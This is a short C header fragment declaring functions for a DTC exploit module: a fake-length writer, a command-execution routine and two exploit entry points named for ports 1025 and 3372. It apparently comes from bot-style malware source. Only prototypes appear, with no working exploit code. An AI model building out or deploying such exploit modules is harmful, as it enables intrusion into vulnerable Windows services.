#ifndef NO_DTC
void Disconnect(SOCKET s);
void WriteFakeLength(DWORD fakelen);
void CommandExec(void);
void BuildContext(char*ip);
BOOL DTC_1025(EXINFO exinfo);
BOOL DTC_3372(EXINFO exinfo);
#endif
